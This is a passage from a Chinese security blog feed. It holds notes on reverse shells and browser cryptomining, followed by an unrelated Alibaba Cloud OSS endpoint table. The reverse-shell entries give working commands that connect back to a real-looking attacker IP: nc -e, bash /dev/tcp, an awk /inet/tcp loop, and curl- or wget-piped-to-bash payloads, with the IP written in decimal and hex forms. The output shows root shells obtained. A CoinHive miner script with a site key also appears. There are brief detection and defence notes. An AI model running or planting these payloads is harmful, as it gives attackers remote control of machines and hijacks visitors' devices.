class="hljs-operator">/</span>nmap<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">13</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">50</span> <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-regexp">/nmap -&gt; /</span>usr<span class="hljs-regexp">/bin/</span>ncat<br></code></pre></td></tr></table></figure><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>CentOS没有 ncat 安装包，但是 ncat 是 nmap 的依赖，安装 nmap 即可安装 ncat</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># yum install ncat</span><br>已加载插件：fastestmirror<br>Loading mirror speeds <span class="hljs-keyword">from</span> cached hostfile<br>没有可用软件包 ncat。<br>错误：无须任何处理<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[root@iZbp1191gh7vw52537lyxrZ ~]# yum install nmap<br>已加载插件：fastestmirror<br>Loading mirror speeds from cached hostfile<br>正在解决依赖关系<br>--&gt; 正在检查事务<br>---&gt; 软件包 nmap.x86<span class="hljs-emphasis">_64.2.6.40-19.el7 将被 安装</span><br><span class="hljs-emphasis">--&gt; 正在处理依赖关系 nmap-ncat = 2:6.40-19.el7，它被软件包 2:nmap-6.40-19.el7.x86_64 需要</span><br><span class="hljs-emphasis">--&gt; 正在检查事务</span><br><span class="hljs-emphasis">---&gt; 软件包 nmap-ncat.x86_</span>64.2.6.40-19.el7 将被 安装<br>--&gt; 解决依赖关系完成<br><br>依赖关系解决<br><br>===============================================================================================================<br> Package                    架构                    版本                           源                     大小<br>===============================================================================================================<br>正在安装:<br><span class="hljs-code"> nmap                       x86_64                  2:6.40-19.el7                  base                  3.9 M</span><br>为依赖而安装:<br><span class="hljs-code"> nmap-ncat                  x86_64                  2:6.40-19.el7                  base                  206 k</span><br><br><span class="hljs-section">事务概要</span><br><span class="hljs-section">===============================================================================================================</span><br>安装  1 软件包 (+1 依赖软件包)<br><br>总下载量：4.2 M<br>安装大小：17 M<br>Is this ok [y/d/N]: y<br>Downloading packages:<br>(1/2): nmap-ncat-6.40-19.el7.x86<span class="hljs-emphasis">_64.rpm                                                 | 206 kB  00:00:00</span><br><span class="hljs-emphasis">(2/2): nmap-6.40-19.el7.x86_64.rpm                                                      | 3.9 MB  00:00:00</span><br><span class="hljs-emphasis">---------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-emphasis">总计                                                                            15 MB/s | 4.2 MB  00:00:00</span><br><span class="hljs-emphasis">Running transaction check</span><br><span class="hljs-emphasis">Running transaction test</span><br><span class="hljs-emphasis">Transaction test succeeded</span><br><span class="hljs-emphasis">Running transaction</span><br><span class="hljs-emphasis">  正在安装    : 2:nmap-ncat-6.40-19.el7.x86_64                                                             1/2</span><br><span class="hljs-emphasis">  正在安装    : 2:nmap-6.40-19.el7.x86_64                                                                  2/2</span><br><span class="hljs-emphasis">  验证中      : 2:nmap-ncat-6.40-19.el7.x86_64                                                             1/2</span><br><span class="hljs-emphasis">  验证中      : 2:nmap-6.40-19.el7.x86_</span>64                                                                  2/2<br><br>已安装:<br><span class="hljs-code">  nmap.x86_64 2:6.40-19.el7</span><br><br>作为依赖被安装:<br><span class="hljs-code">  nmap-ncat.x86_64 2:6.40-19.el7</span><br><br>完毕！<br>[root@iZbp1191gh7vw52537lyxrZ ~]#<br></code></pre></td></tr></table></figure><p>存在某些系统自带的netcat不支持 -e 参数，需要主动编译安装</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">wget https:<span class="hljs-comment">//nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><br>tar -xvzf netcat<span class="hljs-number">-0.7</span><span class="hljs-number">.1</span>.tar.gz<br><br>./configure<br><br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br><br><span class="hljs-built_in">make</span> clean<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶机：10.222.28.37</p><p>攻击机：121.43.138.192</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>攻击机监听指定的端口</p><p>nc -lvp 1234</p><p>靶机执行反弹命令</p><p><strong>nc -e &#x2F;bin&#x2F;sh 攻击机IP 攻击机监控端口</strong></p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>攻击机</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ ~]</span># <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-lvp</span> <span class="hljs-number">1234</span><br><span class="hljs-selector-tag">Ncat</span>: <span class="hljs-selector-tag">Version</span> <span class="hljs-number">7.50</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attribute">Ncat</span>: Listening <span class="hljs-attribute">on </span>:::<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>.<br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>:<span class="hljs-number">62677</span>.<br>id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>whoami<br>root<br></code></pre></td></tr></table></figure><p>靶机</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@1bcd09f6c828</span> opt]<span class="hljs-meta"># nc -e /bin/bash 121.43.138.192 1234</span><br><br></code></pre></td></tr></table></figure><p>PS：</p><p>存在 nc 不支持 -e 命令的情况，可使用以下命令替换(需要再次确认的)</p><p>&#x2F;bin&#x2F;bash | nc attip attport</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attack_bash_shell</title>
    <link href="/2024/11/14/security/secattack/attack_shell/attack_bash_shell/"/>
    <url>/2024/11/14/security/secattack/attack_shell/attack_bash_shell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h1><h2 id="bash-反弹命令"><a href="#bash-反弹命令" class="headerlink" title="bash 反弹命令"></a>bash 反弹命令</h2><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;远程IP&#x2F;远程端口 0&gt;&amp;1</p><h2 id="被攻击主机现象"><a href="#被攻击主机现象" class="headerlink" title="被攻击主机现象"></a>被攻击主机现象</h2><p>目前测试CentOS 7.9 环境下 bash 反弹，进程中不会有攻击IP信息，只有 bash -i 的进程，但是网络中存在攻击IP的连接 </p><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p>netstat -anlp | grep 远程端口</p><p>netstat -anlp | grep 远程IP</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># netstat -anlp | grep 2345</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>10.185.1.1:33024     远程IP:2345        ESTABLISHED 23262/bash<br></code></pre></td></tr></table></figure><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p>通过netstat -anlp 查看恶意网络后再查看相关进程</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># netstat -anlp | grep 2345</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>10.185.1.1:33024     远程IP:2345        ESTABLISHED 23262/bash<br>[root@ /]<span class="hljs-comment"># ps -ef | grep 23262</span><br>root    <span class="hljs-number"> 23262 </span>21777 <span class="hljs-number"> 0 </span>15:12 pts/1    00:00:00 bash -i<br>root    <span class="hljs-number"> 23483 </span>23248 <span class="hljs-number"> 0 </span>15:13 pts/2    00:00:00 grep --color=auto 23262<br></code></pre></td></tr></table></figure><h3 id="文件描述符信息"><a href="#文件描述符信息" class="headerlink" title="文件描述符信息"></a>文件描述符信息</h3><p>通过查看进程的 0 1 文件描述符，也可以协助判断</p><p>如果都是 socket ，表示</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ 23262]<span class="hljs-comment"># cd fd</span><br>[root@ fd]<span class="hljs-comment"># ls</span><br>0 <span class="hljs-number"> 1 </span><span class="hljs-number"> 2 </span> 255<br>[root@ fd]<span class="hljs-comment"># ls -lat</span><br>total 0<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:13<span class="hljs-number"> 255 </span>-&gt; /dev/tty<br>dr-x------<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 0 </span>Dec<span class="hljs-number"> 30 </span>15:12 .<br>dr-xr-xr-x<span class="hljs-number"> 9 </span>root root <span class="hljs-number"> 0 </span>Dec<span class="hljs-number"> 30 </span>15:12 ..<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 0 </span>-&gt; socket:[476752063]<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 1 </span>-&gt; socket:[476752063]<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 2 </span>-&gt; socket:[476752063]<br></code></pre></td></tr></table></figure><h1 id="curl-组合-bash-反弹获取-shell"><a href="#curl-组合-bash-反弹获取-shell" class="headerlink" title="curl 组合 bash 反弹获取 shell"></a>curl 组合 bash 反弹获取 shell</h1><p>攻击主机 web 目录下存放 index.html 或 index.php（需要攻击主机可以解析php文件） 文件，文件内容为 bash 反弹语句</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">121.43.138.192</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>被攻击主机执行 curl 命令即可被获取权限</p><p><strong>curl IP | bash&#x2F;sh</strong></p><p>IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等</p><p>121.43.138.192</p><p>curl 121.43.138.192 | bash&#x2F;sh</p><p>十进制 2032896704</p><p>curl 2032896704 | bash&#x2F;sh</p><p>十六进制 0x792B8AC0</p><p>curl 0x792B8AC0 | bash&#x2F;sh</p><p>二进制 ？？？01111001001010111000101011000000(需要研究)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-number">121.43.138.192</span> | bash<br>curl <span class="hljs-number">121.43.138.192</span> | sh<br>curl <span class="hljs-number">121.43.138.192</span> | /bin/bash<br>curl <span class="hljs-number">121.43.138.192</span> | /bin/sh<br><br></code></pre></td></tr></table></figure><p>攻击成功后</p><p>被攻击主机显示</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@1bcd09f6c828</span> /]<span class="hljs-comment"># curl 121.43.138.192 | bash</span><br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span>    <span class="hljs-number">45</span>  <span class="hljs-number">100</span>    <span class="hljs-number">45</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">495</span>      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>   <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><p>攻击主机显示</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ nginx]</span># <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-lvp</span> <span class="hljs-number">1234</span><br><span class="hljs-selector-tag">Ncat</span>: <span class="hljs-selector-tag">Version</span> <span class="hljs-number">7.50</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attribute">Ncat</span>: Listening <span class="hljs-attribute">on </span>:::<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>.<br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>:<span class="hljs-number">50125</span>.<br>[root<span class="hljs-variable">@1bcd09f6c828</span> /]#<br></code></pre></td></tr></table></figure><p>获取到权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@1bcd09f6c828 /]# id<br>id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br>[root@1bcd09f6c828 /]# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure><h1 id="awk-反弹"><a href="#awk-反弹" class="headerlink" title="awk 反弹"></a>awk 反弹</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">awk &#x27;BEGIN&#123;s=<span class="hljs-string">&quot;/inet/tcp/0/121.43.138.192/1234&quot;</span>;<span class="hljs-keyword">for</span>(;s|&amp;getline c;<span class="hljs-built_in">close</span>(c))<span class="hljs-keyword">while</span>(c|getline)<span class="hljs-built_in">print</span>|&amp;s;<span class="hljs-built_in">close</span>(s)&#125;&#x27;<br></code></pre></td></tr></table></figure><h1 id="wget-组合-bash-反弹获取-shell"><a href="#wget-组合-bash-反弹获取-shell" class="headerlink" title="wget 组合 bash 反弹获取 shell"></a>wget 组合 bash 反弹获取 shell</h1><p>攻击主机 web 目录下存放文件，文件内容为 bash 反弹语句</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">121.43.138.192</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>被攻击主机执行 curl 命令即可被获取权限</p><p><strong>wget attIP&#x2F;attfilename -O &#x2F;tmp&#x2F;x.sh &amp;&amp; bash &#x2F;tmp&#x2F;x.sh</strong></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web_mining</title>
    <link href="/2024/11/14/security/netsec/mining/web_mining/"/>
    <url>/2024/11/14/security/netsec/mining/web_mining/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在网页中添加JS代码，用户在访问到页面时，调用用户设备进行挖矿</p><h1 id="常见挖矿木马"><a href="#常见挖矿木马" class="headerlink" title="常见挖矿木马"></a>常见挖矿木马</h1><p><strong>Coinhive</strong></p><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><p>部分挖矿木马会在关闭浏览器后结束挖矿</p><p>如果浏览器支持WebAssembly，则可能会出现关闭浏览器依然进行挖矿（一种是会在用户设备新启动页面-通过各种隐藏，保持浏览器未关闭）</p><h1 id="挖矿JS"><a href="#挖矿JS" class="headerlink" title="挖矿JS"></a>挖矿JS</h1><p>示例</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://authedmine.com/lib/authedmine.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> miner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoinHive</span>.<span class="hljs-title class_">Anonymous</span>(<span class="hljs-string">&#x27;gUA9gHLBkVURSU7z2Z4W1CRwp9Zan9At&#x27;</span>, </span></span><span class="language-xquery">&#123;throttle: <span class="hljs-number">0</span>.<span class="hljs-number">3</span>&#125;</span><span class="language-xml"><span class="language-javascript">);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-comment">// Only start on non-mobile devices and if not opted-out</span></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-comment">// in the last 14400 seconds (4 hours):</span></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">if</span> (!miner.<span class="hljs-title function_">isMobile</span>() &amp;&amp; !miner.<span class="hljs-title function_">didOptOut</span>(<span class="hljs-number">14400</span>)) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">        miner.<span class="hljs-keyword">start</span>();</span><br><span class="language-xquery">    &#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://coinhive.com/lib/coinhive.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> miner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoinHive</span>.<span class="hljs-title class_">Anonymous</span>(<span class="hljs-string">&#x27;gUA9gHLBkVURSU7z2Z4W1CRwp9Zan9At&#x27;</span>);</span><br><span class="language-javascript">    miner.<span class="hljs-title function_">start</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><p>1、浏览网页时，禁用浏览器JavaScript，防止挖矿脚本感染设备</p><p>2、安装广告拦截软件，检测和拦截嵌有挖矿脚本的网页广告</p><p>3、在浏览器中安装反挖矿插件，阻止攻击者利用浏览器进行挖矿</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>mining</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oss_base</title>
    <link href="/2024/11/13/yunwei/applications/oss/oss_base/"/>
    <url>/2024/11/13/yunwei/applications/oss/oss_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h3 id="桶Bucket"><a href="#桶Bucket" class="headerlink" title="桶Bucket"></a>桶Bucket</h3><p>用于存储对象object的容器，所有的对象都必须隶属于某个存储空间。</p><p>存储空间具有各种配置属性，包括地域、访问权限、存储类型等</p><ul><li>同一个存储空间的内部是扁平的，没有文件系统的目录等概念，所有的对象都直接隶属于其对应的存储空间。</li><li>每个用户可以拥有多个存储空间。</li><li>存储空间的名称在OSS范围内必须是全局（所有阿里云用户）唯一的。存储空间创建成功后，名称将无法修改。</li></ul><p>存储空间的命名规范：</p><p>智能包含小写字母</p><h3 id="对象object"><a href="#对象object" class="headerlink" title="对象object"></a>对象object</h3><h2 id="阿里云节点信息"><a href="#阿里云节点信息" class="headerlink" title="阿里云节点信息"></a>阿里云节点信息</h2><p>Region表示OSS的数据中心所在的地域，Endpoint表示OSS对外服务的访问域名。本文主要介绍Region与Endpoint的对应关系。</p><h3 id="公共云下OSS-Region和Endpoint对照表"><a href="#公共云下OSS-Region和Endpoint对照表" class="headerlink" title="公共云下OSS Region和Endpoint对照表"></a>公共云下OSS Region和Endpoint对照表</h3><p>公共云下OSS各地域Endpoint如下：</p><table><thead><tr><th align="left">Region</th><th align="left">Region ID</th><th align="left">外网Endpoint</th><th align="left">内网Endpoint①</th></tr></thead><tbody><tr><td align="left">华东1（杭州）</td><td align="left">oss-cn-hangzhou</td><td align="left">oss-cn-hangzhou.aliyuncs.com</td><td align="left">oss-cn-hangzhou-internal.aliyuncs.com</td></tr><tr><td align="left">华东2（上海）</td><td align="left">oss-cn-shanghai</td><td align="left">oss-cn-shanghai.aliyuncs.com</td><td align="left">oss-cn-shanghai-internal.aliyuncs.com</td></tr><tr><td align="left">华东5（南京本地地域）</td><td align="left">oss-cn-nanjing</td><td align="left">oss-cn-nanjing.aliyuncs.com</td><td align="left">oss-cn-nanjing-internal.aliyuncs.com</td></tr><tr><td align="left">华北1（青岛）</td><td align="left">oss-cn-qingdao</td><td align="left">oss-cn-qingdao.aliyuncs.com</td><td align="left">oss-cn-qingdao-internal.aliyuncs.com</td></tr><tr><td align="left">华北2（北京）</td><td align="left">oss-cn-beijing</td><td align="left">oss-cn-beijing.aliyuncs.com</td><td align="left">oss-cn-beijing-internal.aliyuncs.com</td></tr><tr><td align="left">华北 3（张家口）</td><td align="left">oss-cn-zhangjiakou</td><td align="left">oss-cn-zhangjiakou.aliyuncs.com</td><td align="left">oss-cn-zhangjiakou-internal.aliyuncs.com</td></tr><tr><td align="left">华北5（呼和浩特）</td><td align="left">oss-cn-huhehaote</td><td align="left">oss-cn-huhehaote.aliyuncs.com</td><td align="left">oss-cn-huhehaote-internal.aliyuncs.com</td></tr><tr><td align="left">华北6（乌兰察布）</td><td align="left">oss-cn-wulanchabu</td><td align="left">oss-cn-wulanchabu.aliyuncs.com</td><td align="left">oss-cn-wulanchabu-internal.aliyuncs.com</td></tr><tr><td align="left">华南1（深圳）</td><td align="left">oss-cn-shenzhen</td><td align="left">oss-cn-shenzhen.aliyuncs.com</td><td align="left">oss-cn-shenzhen-internal.aliyuncs.com</td></tr><tr><td align="left">华南2（河源）</td><td align="left">oss-cn-heyuan</td><td align="left">oss-cn-heyuan.aliyuncs.com</td><td align="left">oss-cn-heyuan-internal.aliyuncs.com</td></tr><tr><td align="left">华南3（广州）</td><td align="left">oss-cn-guangzhou</td><td align="left">oss-cn-guangzhou.aliyuncs.com</td><td align="left">oss-cn-guangzhou-internal.aliyuncs.com</td></tr><tr><td align="left">西南1（成都）</td><td align="left">oss-cn-chengdu</td><td align="left">oss-cn-chengdu.aliyuncs.com</td><td align="left">oss-cn-chengdu-internal.aliyuncs.com</td></tr><tr><td align="left">中国（香港）</td><td align="left">oss-cn-hongkong</td><td align="left">oss-cn-hongkong.aliyuncs.com</td><td align="left">oss-cn-hongkong-internal.aliyuncs.com</td></tr><tr><td align="left">美国（硅谷）*</td><td align="left">oss-us-west-1</td><td align="left">oss-us-west-1.aliyuncs.com</td><td align="left">oss-us-west-1-internal.aliyuncs.com</td></tr><tr><td align="left">美国（弗吉尼亚）*</td><td align="left">oss-us-east-1</td><td align="left">oss-us-east-1.aliyuncs.com</td><td align="left">oss-us-east-1-internal.aliyuncs.com</td></tr><tr><td align="left">日本（东京）*</td><td align="left">oss-ap-northeast-1</td><td align="left">oss-ap-northeast-1.aliyuncs.com</td><td align="left">oss-ap-northeast-1-internal.aliyuncs.com</td></tr><tr><td align="left">韩国（首尔）</td><td align="left">oss-ap-northeast-2</td><td align="left">oss-ap-northeast-2.aliyuncs.com</td><td align="left">oss-ap-northeast-2-internal.aliyuncs.com</td></tr><tr><td align="left">新加坡*</td><td align="left">oss-ap-southeast-1</td><td align="left">oss-ap-southeast-1.aliyuncs.com</td><td align="left">oss-ap-southeast-1-internal.aliyuncs.com</td></tr><tr><td align="left">澳大利亚（悉尼）*</td><td align="left">oss-ap-southeast-2</td><td align="left">oss-ap-southeast-2.aliyuncs.com</td><td align="left">oss-ap-southeast-2-internal.aliyuncs.com</td></tr><tr><td align="left">马来西亚（吉隆坡）*</td><td align="left">oss-ap-southeast-3</td><td align="left">oss-ap-southeast-3.aliyuncs.com</td><td align="left">oss-ap-southeast-3-internal.aliyuncs.com</td></tr><tr><td align="left">印度尼西亚（雅加达）*</td><td align="left">oss-ap-southeast-5</td><td align="left">oss-ap-southeast-5.aliyuncs.com</td><td align="left">oss-ap-southeast-5-internal.aliyuncs.com</td></tr><tr><td align="left">菲律宾（马尼拉）</td><td align="left">oss-ap-southeast-6</td><td align="left">oss-ap-southeast-6.aliyuncs.com</td><td align="left">oss-ap-southeast-6-internal.aliyuncs.com</td></tr><tr><td align="left">泰国（曼谷）</td><td 